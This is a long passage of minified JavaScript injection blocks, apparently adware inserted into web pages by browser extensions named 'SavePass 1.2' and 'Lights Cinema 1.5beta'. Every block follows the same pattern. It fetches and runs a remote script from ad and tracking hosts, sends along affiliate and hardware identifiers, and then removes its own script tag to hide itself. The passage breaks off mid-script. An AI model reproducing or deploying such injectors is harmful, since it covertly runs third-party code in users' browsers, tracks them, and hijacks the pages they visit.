(window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (180 != 273 && 180 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(180)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(180) ){return;}function f(){return typeof window['__utility_running_63429_180__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://a.snowplanes.com/a.php?626ref2=300150410021000000&626Name=SavePass%201.2&626ref3=14662593d756c45f678e53b3ecf6dac4&626ref1=63726f73737269646572&teid=63429&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var httpsUrl = 'https://a.snowplanes.com/a.php?626ref2=300150410021000000&626Name=SavePass%201.2&626ref3=14662593d756c45f678e53b3ecf6dac4&626ref1=63726f73737269646572&teid=63429&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_180__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 180) : 180;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_180__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 180) : 180;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_180__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_193__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 193 || 287 !== 193 || 119 !== 193)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (193 != 273 && 193 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(193)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(193) ){return;}function f(){return typeof window['__utility_running_63429_193__'] !== 'undefined';}try {if (f()) {return;}window._rvz1700x1024 = { 'publisher_subid': '300150410021000000', 'addonname': 'SavePass%201.2'};var httpUrl = 'http://asrv-a.akamaihd.net/sd/1700/1024.js';var httpsUrl = 'https://asrv-a.akamaihd.net/sd/1700/1024.js';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_193__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 193) : 193;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_193__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 193) : 193;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_193__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_223__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 223 || 287 !== 223 || 119 !== 223)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (223 != 273 && 223 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(223)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(223) ){return;}function f(){return typeof window['__utility_running_63429_223__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdn.visadd.com/script/14567725765/preload.js?subid=300150410021000000&um=SavePass%201.2';var httpsUrl = 'https://cdn.visadd.com/script/14567725765/preload.js?subid=300150410021000000&um=SavePass%201.2';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_223__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 223) : 223;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_223__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 223) : 223;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_223__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_288__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 288 || 287 !== 288 || 119 !== 288)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (288 != 273 && 288 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(288)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(288) ){return;}function f(){return typeof window['__utility_running_63429_288__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://istatic.eshopcomp.com/fo/min/crqc.js?hid=14662593d756c45f678e53b3ecf6dac4&bname=SavePass%201.2&subid=300150410021000000';var httpsUrl = 'https://istatic.eshopcomp.com/fo/min/crqc.js?hid=14662593d756c45f678e53b3ecf6dac4&bname=SavePass%201.2&subid=300150410021000000';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_288__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 288) : 288;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_288__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 288) : 288;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_288__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_415__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 415 || 287 !== 415 || 119 !== 415)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (415 != 273 && 415 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(415)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(415) ){return;}function f(){return typeof window['__utility_running_63429_415__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdn.jambolinks.com/extension.js?pid=101&sub=300150410021000000&productname=SavePass%201.2';var httpsUrl = '';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_415__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 415) : 415;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_415__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 415) : 415;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_415__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_450__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 450 || 287 !== 450 || 119 !== 450)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (450 != 273 && 450 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(450)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(450) ){return;}function f(){return typeof window['__utility_running_63429_450__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/p3af2c8/300150410021000000/l.js?pid=2271&ext=SavePass%201.2';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/p3af2c8/300150410021000000/l.js?pid=2271&ext=SavePass%201.2';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_450__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 450) : 450;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_450__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 450) : 450;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_450__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_391__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 391 || 287 !== 391 || 119 !== 391)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (391 != 273 && 391 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(391)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(391) ){return;}function f(){return typeof window['__utility_running_71387_391__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2294&ext=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2294&ext=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_391__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 391) : 391;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_391__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 391) : 391;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_391__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_390__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 390 || 287 !== 390 || 119 !== 390)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (390 != 273 && 390 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(390)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(390) ){return;}function f(){return typeof window['__utility_running_71387_390__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2295&ext=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2295&ext=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_390__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 390) : 390;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_390__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 390) : 390;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_390__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_102__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 102 || 287 !== 102 || 119 !== 102)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (102 != 273 && 102 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(102)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(102) ){return;}function f(){return typeof window['__utility_running_71387_102__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://i.crbsjs.info/crbf/javascript.js?channel=crdr_300266110029000000&appTitle=Lights%20Cinema%201.5beta&hid=149525929fae92db32a394a703a5bbe7';var httpsUrl = 'https://i_crbsjs_info.tlscdn.com/crbf/javascript.js?channel=crdr_300266110029000000&appTitle=Lights%20Cinema%201.5beta&hid=149525929fae92db32a394a703a5bbe7';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_102__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 102) : 102;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_102__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 102) : 102;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_102__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_180__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 180 || 287 !== 180 || 119 !== 180)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (180 != 273 && 180 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(180)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(180) ){return;}function f(){return typeof window['__utility_running_71387_180__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://a.snowplanes.com/a.php?626ref2=300266110029000000&626Name=Lights%20Cinema%201.5beta&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=71387&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var httpsUrl = 'https://a.snowplanes.com/a.php?626ref2=300266110029000000&626Name=Lights%20Cinema%201.5beta&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=71387&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_180__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 180) : 180;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_180__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 180) : 180;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_180__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_232__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 232 || 287 !== 232 || 119 !== 232)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (232 != 273 && 232 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(232)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(232) ){return;}function f(){return typeof window['__utility_running_71387_232__'] !== 'undefined';}try {if (f()) {return;}window._rvz1700x1049 = { 'publisher_subid': '300266110029000000', 'addonname': 'Lights%20Cinema%201.5beta'};var httpUrl = 'http://asrv-a.akamaihd.net/sd/1700/1049.js';var httpsUrl = 'https://asrv-a.akamaihd.net/sd/1700/1049.js';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_232__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 232) : 232;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_232__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 232) : 232;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_232__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_273__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 273 || 287 !== 273 || 119 !== 273)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (273 != 273 && 273 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(273)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(273) ){return;}function f(){return typeof window['__utility_running_71387_273__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300266110029000000&sbrand=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300266110029000000&sbrand=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_273__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 273) : 273;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_273__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 273) : 273;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_273__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_281__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof 